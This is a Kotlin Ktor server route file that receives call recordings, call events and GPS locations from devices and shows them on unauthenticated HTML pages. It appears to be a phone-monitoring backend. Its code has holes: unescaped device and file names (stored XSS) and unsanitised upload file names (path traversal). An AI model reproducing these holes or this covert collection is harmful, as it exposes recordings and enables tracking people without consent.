
package com.example.ktorservice.routes

import com.example.ktorservice.model.CallEventRequest
import com.example.ktorservice.model.CallEventResponse
import com.example.ktorservice.model.LatestRecording
import com.example.ktorservice.model.LocationRequest
import com.example.ktorservice.model.LocationResponse
import com.example.ktorservice.model.RecordingUploadResponse
import com.example.ktorservice.model.ViewedIdsBatchRequest
import com.example.ktorservice.model.ViewedIdsBatchResponse
import com.example.ktorservice.repository.ViewedItemRepository
import io.ktor.http.HttpStatusCode
import io.ktor.http.content.PartData
import io.ktor.http.content.forEachPart
import io.ktor.server.request.receive
import io.ktor.server.request.receiveMultipart
import io.ktor.server.response.respond
import io.ktor.server.routing.Route
import io.ktor.server.routing.get
import io.ktor.server.routing.post
import java.io.File
import io.ktor.utils.io.jvm.javaio.copyTo
import io.ktor.http.ContentType
import io.ktor.server.response.respondFile
import io.ktor.server.response.respondText
import io.ktor.server.routing.delete
import com.example.ktorservice.model.RecordingFile
import com.example.ktorservice.model.RecordingDeleteResponse
import com.example.ktorservice.repository.LocationRepository
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

private const val MAX_LOCATIONS = 50
fun Route.viewedItemRoutes(
    repository: ViewedItemRepository,
    locationRepository: LocationRepository
) {
    val callEvents = mutableListOf<CallEventRequest>()

    get("/recordings/latest") {

        val recordingsDir =
            File("data", "recordings")

        if (!recordingsDir.exists()) {

            call.respond(
                HttpStatusCode.NotFound,
                "Không tìm thấy thư mục recordings"
            )

            return@get
        }

        val latestFile =
            recordingsDir
                .listFiles()
                ?.filter {

                    it.isFile &&
                            it.extension.equals(
                                "m4a",
                                ignoreCase = true
                            )
                }
                ?.maxByOrNull {

                    it.lastModified()
                }

        if (latestFile == null) {

            call.respond(
                HttpStatusCode.NotFound,
                "Không có file ghi âm"
            )

            return@get
        }

        call.respond(

            LatestRecording(

                name =
                    latestFile.name,

                size =
                    latestFile.length(),

                lastModified =
                    latestFile.lastModified()
            )
        )
    }
    get("/recordings/list") {

        val recordingsDir =
            File("data", "recordings")

        if (!recordingsDir.exists()) {

            call.respond(
                emptyList<RecordingFile>()
            )

            return@get
        }

        val files =
            recordingsDir
                .listFiles()
                ?.filter {
                    it.isFile &&
                            it.extension.equals(
                                "m4a",
                                ignoreCase = true
                            )
                }
                ?.sortedByDescending {
                    it.lastModified()
                }
                ?.map {

                    RecordingFile(
                        fileName = it.name,
                        size = it.length(),
                        lastModified = it.lastModified()
                    )
                }
                ?: emptyList()

        call.respond(files)
    }
    get("/recordings") {

        val recordingsDir =
            File("data", "recordings")

        if (!recordingsDir.exists()) {
            call.respondText(
                """
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>Recordings</title>
            </head>
            <body>
                <h1>Recordings</h1>
                <p>Chưa có file ghi âm.</p>
            </body>
            </html>
            """.trimIndent(),
                ContentType.Text.Html
            )
            return@get
        }

        val files =
            recordingsDir
                .listFiles()
                ?.filter {
                    it.isFile &&
                            it.extension.equals(
                                "m4a",
                                ignoreCase = true
                            )
                }
                ?.sortedByDescending {
                    it.lastModified()
                }
                ?: emptyList()

        val html = buildString {

            append(
                """
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport"
                      content="width=device-width, initial-scale=1.0">

                <title>Audio Recordings</title>

                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 30px;
                        background: #f5f5f5;
                    }

                    h1 {
                        margin-bottom: 20px;
                    }

                    .recording {
                        background: white;
                        padding: 15px;
                        margin-bottom: 15px;
                        border-radius: 10px;
                        box-shadow: 0 2px 6px rgba(0,0,0,0.1);
                    }

                    .name {
                        font-weight: bold;
                        margin-bottom: 8px;
                        word-break: break-all;
                    }

                    .info {
                        color: #666;
                        font-size: 14px;
                        margin-bottom: 10px;
                    }

                    audio {
                        width: 100%;
                    }

                    .download {
                        display: inline-block;
                        margin-top: 10px;
                        text-decoration: none;
                    }
                </style>
            </head>

            <body>

            <h1>Audio Recordings</h1>

            <p>
                Tổng số file: ${files.size}
            </p>
            """.trimIndent()
            )

            if (files.isEmpty()) {

                append(
                    """
                <p>Chưa có file ghi âm.</p>
                """.trimIndent()
                )

            } else {

                files.forEach { file ->

                    val encodedName =
                        java.net.URLEncoder
                            .encode(
                                file.name,
                                Charsets.UTF_8
                            )
                            .replace("+", "%20")

                    val sizeMb =
                        "%.2f".format(
                            file.length() / 1024.0 / 1024.0
                        )

                    append(
                        """
                    <div class="recording">

                        <div class="name">
                            ${file.name}
                        </div>

                        <div class="info">
                            ${sizeMb} MB
                        </div>

                        <audio controls preload="none">
                            <source
                                src="/recordings/$encodedName"
                                type="audio/mp4">
                            Trình duyệt không hỗ trợ audio.
                        </audio>

                        <br>

                        <a
                            class="download"
                            href="/recordings/$encodedName"
                            download>
                            Tải xuống
                        </a>

                    </div>
                    """.trimIndent()
                    )
                }
            }

            append(
                """
            </body>
            </html>
            """.trimIndent()
            )
        }

        call.respondText(
            html,
            ContentType.Text.Html
        )
    }
    get("/recordings/{fileName}") {

        val fileName =
            call.parameters["fileName"]

        if (fileName.isNullOrBlank()) {

            call.respond(
                HttpStatusCode.BadRequest,
                "File name is required"
            )

            return@get
        }

        val recordingsDir =
            File("data", "recordings")

        val file =
            File(
                recordingsDir,
                fileName
            )

        // Không cho truy cập ra ngoài thư mục recordings
        if (
            !file.canonicalPath.startsWith(
                recordingsDir.canonicalPath
            )
        ) {

            call.respond(
                HttpStatusCode.Forbidden,
                "Access denied"
            )

            return@get
        }

        if (!file.exists() || !file.isFile) {

            call.respond(
                HttpStatusCode.NotFound,
                "File not found"
            )

            return@get
        }

        call.respondFile(file)
    }
    get("/viewed-ids") {

        val ids =
            repository.getAllIds()

        call.respond(ids)
    }

    get("/call-events") {

        val html = buildString {

            appendLine("<html>")
            appendLine("<head>")
            appendLine("<meta charset=\"UTF-8\">")
            appendLine("<title>Call Events</title>")
            appendLine("</head>")
            appendLine("<body>")

            appendLine("<h1>Call Events</h1>")

            if (callEvents.isEmpty()) {

                appendLine("<p>Chưa có call event nào.</p>")

            } else {

                appendLine("<table border=\"1\" cellpadding=\"8\">")

                appendLine("<tr>")
                appendLine("<th>Device</th>")
                appendLine("<th>Event</th>")
                appendLine("<th>Timestamp</th>")
                appendLine("</tr>")

                callEvents.forEach { event ->

                    appendLine("<tr>")

                    appendLine("<td>${event.deviceName}</td>")
                    appendLine("<td>${event.event}</td>")
                    appendLine("<td>${event.timestamp}</td>")

                    appendLine("</tr>")
                }

                appendLine("</table>")
            }

            appendLine("</body>")
            appendLine("</html>")
        }

        call.respondText(
            html,
            ContentType.Text.Html
        )
    }

    post("/call-events") {

        println("========== POST /call-events HIT ==========")

        try {

            val request = call.receive<CallEventRequest>()

            println(
                "📞 CALL EVENT" +
                        "\ndeviceName = ${request.deviceName}" +
                        "\nevent = ${request.event}" +
                        "\ntimestamp = ${request.timestamp}"
            )

            callEvents.add(request)

            call.respond(
                HttpStatusCode.OK,
                CallEventResponse(
                    success = true,
                    message = "Call event received",
                    deviceName = request.deviceName,
                    event = request.event
                )
            )

        } catch (e: Exception) {

            println("========== CALL EVENT ERROR ==========")
            println("Exception = ${e::class.qualifiedName}")
            println("Message = ${e.message}")

            e.printStackTrace()

            call.respond(
                HttpStatusCode.InternalServerError,
                CallEventResponse(
                    success = false,
                    message = e.message ?: "Unknown error"
                )
            )
        }
    }


    get("/location") {

        val locations =
            locationRepository.getAll()

        val html =
            buildString {

                appendLine("<html>")
                appendLine("<head>")

                appendLine(
                    "<meta charset=\"UTF-8\">"
                )

                appendLine(
                    "<meta name=\"viewport\" " +
                            "content=\"width=device-width, initial-scale=1.0\">"
                )

                appendLine(
                    "<title>Locations</title>"
                )

                appendLine("</head>")

                appendLine("<body>")

                appendLine(
                    "<h1>Location History</h1>"
                )

                appendLine(
                    "<p>Total locations: ${locations.size}</p>"
                )

                if (locations.isEmpty()) {

                    appendLine(
                        "<p>Chưa có location nào.</p>"
                    )

                } else {

                    appendLine(
                        "<table border=\"1\" cellpadding=\"8\" cellspacing=\"0\">"
                    )

                    appendLine("<tr>")

                    appendLine(
                        "<th>Device</th>"
                    )

                    appendLine(
                        "<th>Latitude</th>"
                    )

                    appendLine(
                        "<th>Longitude</th>"
                    )

                    appendLine(
                        "<th>Timestamp</th>"
                    )

                    appendLine(
                        "<th>Google Maps</th>"
                    )

                    appendLine("</tr>")

                    locations.forEach { location ->
                        val formattedTime =
                            SimpleDateFormat(
                                "dd/MM/yyyy HH:mm:ss",
                                Locale.getDefault()
                            ).format(
                                Date(location.timestamp)
                            )

                        val mapsUrl =
                            "https://www.google.com/maps/search/?api=1&query=" +
                                    "${location.latitude},${location.longitude}"

                        appendLine("<tr>")

                        appendLine(
                            "<td>${location.deviceName}</td>"
                        )

                        appendLine(
                            "<td>${location.latitude}</td>"
                        )

                        appendLine(
                            "<td>${location.longitude}</td>"
                        )

                        appendLine(
                            "<td>$formattedTime<br>" +
                                    "<small>${location.timestamp}</small>" +
                                    "</td>"
                        )

                        appendLine(
                            "<td>" +
                                    "<a href=\"$mapsUrl\" target=\"_blank\">" +
                                    "Xem bản đồ" +
                                    "</a>" +
                                    "</td>"
                        )

                        appendLine("</tr>")
                    }

                    appendLine("</table>")
                }

                appendLine("</body>")
                appendLine("</html>")
            }

        call.respondText(
            html,
            ContentType.Text.Html
        )
    }
    post("/location") {

        try {

            val request =
                call.receive<LocationRequest>()

            println(
                """
            ========== LOCATION ==========
            deviceName = ${request.deviceName}
            latitude   = ${request.latitude}
            longitude  = ${request.longitude}
            timestamp  = ${request.timestamp}
            """.trimIndent()
            )

            locationRepository.insert(
                request
            )

            call.respond(
                HttpStatusCode.OK,
                LocationResponse(
                    success = true,
                    message = "Location received",
                    deviceName = request.deviceName,
                    latitude = request.latitude,
                    longitude = request.longitude,
                    timestamp = request.timestamp
                )
            )

        } catch (e: Exception) {

            println(
                "========== LOCATION ERROR =========="
            )

            e.printStackTrace()

            call.respond(
                HttpStatusCode.InternalServerError,
                LocationResponse(
                    success = false,
                    message =
                        e.message
                            ?: "Unknown error"
                )
            )
        }
    }

    get("/viewed-hashes") {

        val hashes =
            repository.getAllHashes()

        call.respond(hashes)
    }

    post("/viewed-ids") {

        try {

            val id =
                call.receive<Long>()

            repository.insertId(id)

            call.respond(
                HttpStatusCode.OK,
                "Added"
            )

        } catch (e: Exception) {

            call.respond(
                HttpStatusCode.InternalServerError,
                "Error: ${e.message}"
            )
        }
    }

    post("/viewed-hashes") {

        try {

            val hash =
                call.receive<String>()

            repository.insertHash(hash)

            call.respond(
                HttpStatusCode.OK,
                "Added"
            )

        } catch (e: Exception) {

            call.respond(
                HttpStatusCode.InternalServerError,
                "Error: ${e.message}"
            )
        }
    }

    post("/viewed-ids/batch") {

        println(
            "========== POST /viewed-ids/batch =========="
        )

        try {

            val request =
                call.receive<ViewedIdsBatchRequest>()

            println(
                "Received IDs: ${request.ids}"
            )

            repository.insertIds(
                request.ids
            )

            println(
                "insertIds completed successfully"
            )

            call.respond(
                HttpStatusCode.OK,
                ViewedIdsBatchResponse(
                    success = true,
                    count = request.ids.size,
                    message = "IDs inserted successfully"
                )
            )

        } catch (e: Exception) {

            println(
                "========== BATCH ERROR =========="
            )

            println(
                "Exception: ${e::class.qualifiedName}"
            )

            println(
                "Message: ${e.message}"
            )

            e.printStackTrace()

            call.respond(
                HttpStatusCode.InternalServerError,
                ViewedIdsBatchResponse(
                    success = false,
                    count = 0,
                    message =
                        e.message
                            ?: "Unknown error"
                )
            )
        }
    }

    /**
     * Upload file ghi âm.
     *
     * POST /recordings/upload
     */
    post("/recordings/upload") {

        try {

            val multipart =
                call.receiveMultipart()

            var savedFile: File? = null

            var deviceName =
                "Unknown"

            multipart.forEachPart { part ->

                when (part) {

                    is PartData.FormItem -> {

                        if (part.name == "deviceName") {

                            deviceName =
                                part.value
                                    .replace("\\", "_")
                                    .replace("/", "_")
                                    .replace(":", "_")
                                    .replace("*", "_")
                                    .replace("?", "_")
                                    .replace("\"", "_")
                                    .replace("<", "_")
                                    .replace(">", "_")
                                    .replace("|", "_")
                        }
                    }

                    is PartData.FileItem -> {

                        val originalName =
                            part.originalFileName
                                ?: "recording_${System.currentTimeMillis()}.m4a"

                        val recordingsDir =
                            File(
                                "data",
                                "recordings"
                            )

                        if (!recordingsDir.exists()) {

                            recordingsDir.mkdirs()
                        }

                        val file =
                            File(
                                recordingsDir,
                                "${deviceName}_$originalName"
                            )

                        val input =
                            part.provider()

                        file.outputStream().use { output ->

                            input.copyTo(output)
                        }

                        savedFile = file

                        println(
                            "Recording saved: ${file.absolutePath}"
                        )

                        println(
                            "Device: $deviceName"
                        )

                        println(
                            "File size: ${file.length()} bytes"
                        )
                    }

                    else -> {}
                }

                part.dispose()
            }

            val file =
                savedFile
                    ?: run {

                        call.respond(
                            HttpStatusCode.BadRequest,
                            mapOf(
                                "success" to false,
                                "message" to "No file uploaded"
                            )
                        )

                        return@post
                    }

            call.respond(
                HttpStatusCode.OK,
                RecordingUploadResponse(
                    success = true,
                    fileName = file.name,
                    message = "Recording uploaded successfully"
                )
            )

        } catch (e: Exception) {

            println(
                "UPLOAD RECORDING ERROR: ${e.message}"
            )

            e.printStackTrace()

            call.respond(
                HttpStatusCode.InternalServerError,
                RecordingUploadResponse(
                    success = false,
                    fileName = "",
                    message =
                        e.message
                            ?: "Upload failed"
                )
            )
        }
    }
    delete("/recordings/{fileName}") {

        try {

            val fileName =
                call.parameters["fileName"]

            if (fileName.isNullOrBlank()) {

                call.respond(
                    HttpStatusCode.BadRequest,
                    RecordingDeleteResponse(
                        success = false,
                        fileName = "",
                        message = "File name is required"
                    )
                )

                return@delete
            }

            val recordingsDir =
                File("data", "recordings")

            if (!recordingsDir.exists()) {

                call.respond(
                    HttpStatusCode.NotFound,
                    RecordingDeleteResponse(
                        success = false,
                        fileName = fileName,
                        message = "Recordings directory not found"
                    )
                )

                return@delete
            }

            val file =
                File(
                    recordingsDir,
                    fileName
                )

            println(
                "DELETE recording:"
            )

            println(
                "Directory = ${recordingsDir.absolutePath}"
            )

            println(
                "File = ${file.absolutePath}"
            )

            println(
                "Exists = ${file.exists()}"
            )

            println(
                "IsFile = ${file.isFile}"
            )

            if (!file.exists() || !file.isFile) {

                call.respond(
                    HttpStatusCode.NotFound,
                    RecordingDeleteResponse(
                        success = false,
                        fileName = fileName,
                        message = "File not found"
                    )
                )

                return@delete
            }

            // Chống path traversal
            val directoryPath =
                recordingsDir
                    .canonicalFile
                    .toPath()

            val filePath =
                file
                    .canonicalFile
                    .toPath()

            if (!filePath.startsWith(directoryPath)) {

                call.respond(
                    HttpStatusCode.Forbidden,
                    RecordingDeleteResponse(
                        success = false,
                        fileName = fileName,
                        message = "Access denied"
                    )
                )

                return@delete
            }

            val deleted =
                file.delete()

            println(
                "Delete result = $deleted"
            )

            if (!deleted) {

                call.respond(
                    HttpStatusCode.InternalServerError,
                    RecordingDeleteResponse(
                        success = false,
                        fileName = fileName,
                        message = "Cannot delete file"
                    )
                )

                return@delete
            }

            call.respond(
                HttpStatusCode.OK,
                RecordingDeleteResponse(
                    success = true,
                    fileName = fileName,
                    message = "Recording deleted"
                )
            )

        } catch (e: Exception) {

            println(
                "========== DELETE RECORDING ERROR =========="
            )

            e.printStackTrace()

            call.respond(
                HttpStatusCode.InternalServerError,
                RecordingDeleteResponse(
                    success = false,
                    fileName =
                        call.parameters["fileName"]
                            ?: "",
                    message =
                        e.message
                            ?: "Delete failed"
                )
            )
        }
    }


}

